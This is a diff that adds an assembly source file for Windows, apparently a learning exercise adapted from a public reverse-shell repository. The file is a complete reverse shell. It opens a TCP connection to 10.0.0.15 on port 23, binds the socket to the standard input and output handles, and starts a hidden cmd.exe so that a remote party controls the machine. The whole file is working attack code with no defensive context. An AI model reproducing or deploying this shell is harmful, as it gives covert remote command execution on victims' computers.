@@ -1,0 +1,51 @@
+include 'win32ax.inc'
+;https://raw.githubusercontent.com/sh3llc0d3r1337/windows_reverse_shell_1/master/shellcode.asm
+
+main:
+	invoke LoadLibrary, ws2
+	mov ebx, eax				;winsocket dll handle is saved into ebx
+	invoke WSAStartup, 0x0190, wsa		;initiale winsocket settings
+	invoke GetProcAddress, ebx, wsaSock	;get addres of WSASocketA
+
+	xor ebx, ebx				;cant just call WSASocket directly, just use the stack to help
+	push ebx     ;0
+	push ebx     ;0
+	push ebx     ;0
+	xor ecx, ecx
+	mov cl, 6
+	push ecx      ;6			;AF_INET
+	inc ebx
+	push ebx      ;1			;SOCK_STREAM = TCP
+	inc ebx
+	push ebx      ;2			;IP protocol
+	call eax				;invoke WSASocketA, 2,1,6,0, 0, 0
+
+	xchg eax, edi				;Save the WSASocket handle into edi
+	mov [saddr.sin_addr], 0x0f00000a	;10.0.0.15 = 0a00000f, htons 0f00000a
+	mov [saddr.sin_port], 0x1700		;port 23 = 0x0017, htons 0x0017
+	mov [saddr.sin_family], AF_INET 	;IP proto
+	invoke connect, edi, saddr, 16		;return 0 if success
+
+	mov [s.hStdInput], edi			;redirecting stdIn from new connected socker
+	mov [s.hStdOutput], edi 		;stdout
+	mov [s.hStdError], edi			;stderror
+	mov [s.cb], sizeof.STARTUPINFO
+	mov [s.wShowWindow], 0
+	mov [s.dwFlags], STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES
+						;STARTF_USESTDHANDLE  = 0x00000100
+						;since hStd.. are set this value must be set
+						;biibherit handle??
+						;STARTF_USESHOWWINDOS =  0x00000001
+						;says the wShowWindow has additional info
+						;without it, a console will popup and stay there
+	invoke CreateProcess, 0, cmd, 0, 0, 1, 0, 0, 0, s, p
+
+ws2 db 'ws2_32.dll',0
+wsaSock db 'WSASocketA',0
+saddr sockaddr_in
+wsa WSADATA
+cmd db 'cmd',0
+p PROCESS_INFORMATION
+s STARTUPINFO
+
+.end main
